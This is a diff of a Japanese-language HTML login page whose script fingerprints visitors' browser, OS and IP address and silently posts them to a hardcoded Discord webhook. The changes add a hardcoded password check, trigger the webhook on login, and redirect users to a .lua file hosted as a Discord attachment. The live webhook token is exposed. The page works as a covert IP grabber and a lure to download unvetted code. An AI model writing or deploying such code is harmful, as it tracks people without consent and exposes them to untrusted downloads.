@@ -25,17 +25,15 @@
 
 <!-- 名前とパスワード入力フォーム -->
 <form id="loginForm">
-    <label for="username">名前:</label>
-    <input type="text" id="username" name="username">
-    <br>
+    <label for="username">ユーザー名:</label>
+    <input type="text" id="username" name="username"><br><br>
     <label for="password">パスワード:</label>
-    <input type="password" id="password" name="password">
-    <br>
-    <button type="button" onclick="checkLogin()">Login</button>
+    <input type="password" id="password" name="password"><br><br>
+    <button type="button" onclick="login()">ログイン</button>
 </form>
 
-<!-- リンクボタン -->
-<button id="accessButton" style="display:none;" onclick="redirectToLink()">Continue</button>
+<!-- Continueボタン -->
+<button id="continueButton" style="display:none;" onclick="redirectToLink()">Continue</button>
 
 <div class="device-info" style="display: none;">
     <p><span class="info-label">IPアドレス:</span> <span id="ipAddress"></span></p>
@@ -48,7 +46,7 @@
     var os = "Unknown";
     var osVersion = "Unknown";
 
-    // ブラウザとバージョン
+    // ブラウザとバージョンの判定
     if (userAgent.indexOf("Firefox") > -1) {
         browser = "Firefox";
         browserVersion = userAgent.split("Firefox/")[1];
@@ -65,7 +63,7 @@
             : userAgent.split("rv:")[1].split(")")[0];
     }
 
-    // OSとバージョン
+    // OSとバージョンの判定
     if (userAgent.indexOf("Windows") > -1) {
         os = "Windows";
         osVersion = userAgent.split("Windows NT ")[1].split(";")[0];
@@ -80,7 +78,7 @@
         osVersion = userAgent.split("OS ")[1].split(" ")[0];
     }
 
-    // IPアドレス取得
+    // IPアドレスの取得
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
@@ -91,10 +89,10 @@
         });
 
     // DiscordのWebhookにデータを送信する関数
-    function sendDataToDiscord(ipAddress, browser, browserVersion, os, osVersion, username) {
-        var webhookURL = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G'; // ここにDiscordのWebhookのURLを入力してください
+    function sendDataToDiscord(ipAddress, browser, browserVersion, os, osVersion) {
+        var webhookURL = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G'; // DiscordのWebhookのURL
         var data = {
-            content: '```端末情報:\nブラウザ: ' + browser + '\nブラウザバージョン: ' + browserVersion + '\nOS: ' + os + '\nOSバージョン: ' + osVersion + '\nIPアドレス: ' + ipAddress + '\n名前: ' + username + '```'
+            content: '```端末情報:\nブラウザ: ' + browser + '\nブラウザバージョン: ' + browserVersion + '\nOS: ' + os + '\nOSバージョン: ' + osVersion + '\nIPアドレス: ' + ipAddress + '```'
         };
 
         fetch(webhookURL, {
@@ -115,22 +113,22 @@
         });
     }
 
-    // ログインチェック関数
-    function checkLogin() {
+    // ログイン関数
+    function login() {
         var username = document.getElementById("username").value;
         var password = document.getElementById("password").value;
-        // 名前とパスワードが正しい場合
-        if (username !== "" && password !== "") {
-            document.getElementById("accessButton").style.display = "block"; // ボタンを表示
+        
+        if (password === "45451919") {
+            document.getElementById("continueButton").style.display = "block";
+            sendDataToDiscord(username, browser, browserVersion, os, osVersion);
         } else {
-            alert("名前とパスワードを入力してください。");
+            alert("パスワードが正しくありません。");
         }
     }
 
     // リンク先へリダイレクトする関数
     function redirectToLink() {
-        // index1.htmlにリダイレクト
-        window.location.href = "https://www.youtube.com/";
+        window.location.href = "https://cdn.discordapp.com/attachments/1223447103116935178/1240124023568990238/776826c9e558e35a.lua?ex=66456aff&is=6644197f&hm=517f07a5aa74e14063b26e3078db7d9dd68848d79d7f8546506f4d080f1cad3c&";
     }
 </script>
 
